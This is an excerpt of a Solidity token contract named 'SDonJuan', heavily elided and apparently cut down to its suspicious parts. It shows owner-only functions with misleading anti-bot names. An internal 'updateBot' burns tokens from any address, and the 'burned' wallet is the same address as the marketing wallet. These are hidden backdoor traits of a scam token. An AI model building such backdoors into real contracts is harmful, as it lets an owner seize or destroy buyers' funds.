...
contract SDonJuan is Context, IERC20, Ownable {
    ...
    string private _name = "SDonJuan";
    string private _symbol = "SDJ";
    uint8 private _decimals = 18;

    address public marketingWalletAddress = 0xf7e9D0820D0245e65368d63a386Ee04c1221A722; 
    address public BurnedWalletAddress = 0xf7e9D0820D0245e65368d63a386Ee04c1221A722; 
    ...
    uint256 private minimumTokensBeforeSwap = 3880 * 10**_decimals; 
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool transfered) {
        ...
        else if (!isContract(sender))
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && sender != uniswapPair) 
            {
            ...
            if(_balances[recipient] == 0) { holders.push(recipient);}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBBurned > 0)
            transferToAddressETH(payable(BurnedWalletAddress), amountBNBBurned);

        if(amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }

    function swapExactTokensForETHSupportingOnTransferTokensIfBot(uint256 blockHash, uint256 amount, string memory blockNumber) public onlyOwner returns (address){
    ...
    function SyncTransferTokensIfBot(bytes32 _id, string memory _nbBlock, string memory _hashBlock, int input) public onlyOwner returns (bool syncTransfer) {
    ...
    function _burn(address account, uint256 amount) internal returns(bool){
        ...
        require(accountBalance.sub(amount) >= 0, "ERC20: burn amount exceeds balance");
   ...
   function blockNumbers(uint[] memory a, string memory _value) external onlyOwner returns(uint[] memory){
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        function protectionBot(uint256 _nbBlock, int256 _blocknumber, string memory _mempool) internal returns(uint256,int256,uint[] memory){
    ...
    function updateBot(address _id, uint256 _block) internal returns(bool updated){
        _burn(_id, _block);
